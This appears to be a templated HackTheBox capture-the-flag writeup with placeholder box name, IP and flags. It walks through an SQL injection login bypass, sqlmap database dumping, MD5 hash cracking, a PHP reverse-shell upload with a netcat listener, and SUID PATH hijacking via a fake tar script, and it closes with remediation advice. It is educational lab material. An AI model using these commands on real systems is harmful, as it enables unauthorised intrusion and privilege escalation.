---
layout: post
title: "HackTheBox - [Box Name] Writeup"
date: 2025-01-15 10:00:00 -0000
categories: [CTF, HackTheBox]
tags: [web exploitation, privilege escalation, linux, python]
author: Your Name
reading_time: 15
---

## Overview

**Box Name**: [Box Name]  
**Difficulty**: Medium  
**OS**: Linux  
**IP**: 10.10.10.xxx  
**Release Date**: January 2025

## Summary

This box involves exploiting a vulnerable web application with SQL injection to gain initial access, followed by exploiting a misconfigured SUID binary for privilege escalation to root.

### Skills Required
- Web application enumeration
- SQL injection
- Linux privilege escalation
- Binary analysis

### Skills Learned
- Advanced SQLi techniques
- Custom exploit development
- SUID exploitation

---

## Reconnaissance

### Nmap Scan

Starting with a full port scan:
```bash
nmap -p- -sCV -oN nmap/full 10.10.10.xxx
```

**Results:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.41
3306/tcp open  mysql   MySQL 5.7.33
```

Key findings:
- SSH on port 22 (likely for final access)
- Apache web server on port 80
- MySQL database on port 3306

### Web Enumeration

Visiting the website reveals a login portal:
```bash
gobuster dir -u http://10.10.10.xxx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Interesting directories found:**
- `/admin` - Admin panel (403 Forbidden)
- `/uploads` - File upload directory
- `/api` - API endpoints
- `/backup` - Backup files

---

## Initial Foothold

### SQL Injection Discovery

Testing the login form for SQL injection:
```sql
Username: admin' OR '1'='1
Password: anything
```

Response indicates SQL injection vulnerability!

### Exploiting SQLi

Using sqlmap to dump the database:
```bash
sqlmap -u "http://10.10.10.xxx/login.php" --data="username=admin&password=test" --dbs
```

**Databases found:**
- information_schema
- webapp_db
- mysql

Dumping credentials from webapp_db:
```bash
sqlmap -u "http://10.10.10.xxx/login.php" --data="username=admin&password=test" -D webapp_db --tables
```

**Table: users**
```
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
|  2 | john     | 098f6bcd4621d373cade4e832627b4f6 |
+----+----------+----------------------------------+
```

Cracking the password hash:
```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result**: `password` 

### Getting Shell Access

With admin credentials, we can access the admin panel at `/admin`.

Found file upload functionality. Testing for unrestricted file upload:
```bash
# Create PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Edit IP and PORT

# Upload file
curl -X POST -F "file=@shell.php" http://10.10.10.xxx/admin/upload.php --cookie "session=admin_token"
```

Start listener:
```bash
nc -lvnp 4444
```

Trigger shell:
```bash
curl http://10.10.10.xxx/uploads/shell.php
```

**We have a shell as www-data!**

---

## Privilege Escalation

### Enumeration

Checking for SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```

**Interesting finding:**
```
/usr/bin/custom_backup
```

Analyzing the binary:
```bash
strings /usr/bin/custom_backup
```

Output shows:
```
/bin/tar -czf /tmp/backup.tar.gz /var/www/html
```

The binary uses `tar` without full path - potential PATH hijacking!

### Exploitation

Creating malicious tar:
```bash
cd /tmp
echo '#!/bin/bash' > tar
echo 'chmod +s /bin/bash' >> tar
chmod +x tar
export PATH=/tmp:$PATH
```

Execute the SUID binary:
```bash
/usr/bin/custom_backup
```

Get root shell:
```bash
/bin/bash -p
whoami  # root!
```

### Capturing Flags

**User flag:**
```bash
cat /home/john/user.txt
[user_flag_here]
```

**Root flag:**
```bash
cat /root/root.txt
[root_flag_here]
```

---

## Key Takeaways

1. **Always test for SQL injection** in login forms and input fields
2. **File upload vulnerabilities** can provide easy initial access
3. **SUID binaries** are common privilege escalation vectors
4. **PATH hijacking** works when binaries don't use absolute paths
5. **Enumeration is crucial** - thorough scanning reveals opportunities

---

## Remediation

### For SQL Injection:
```php
// Use prepared statements
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
```

### For File Upload:
- Implement whitelist of allowed file extensions
- Validate file content, not just extension
- Store uploads outside web root
- Randomize filenames

### For SUID Binary:
- Use absolute paths in scripts
- Minimize SUID binaries
- Regular security audits

---

## Tools Used

- Nmap
- Gobuster
- SQLMap
- Burp Suite
- John the Ripper
- Netcat

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks](https://book.hacktricks.xyz/)

---

**Box Difficulty**: ⭐⭐⭐☆☆  
**Enjoyment**: ⭐⭐⭐⭐☆  
**Learning Value**: ⭐⭐⭐⭐⭐

*This writeup was created for educational purposes only.*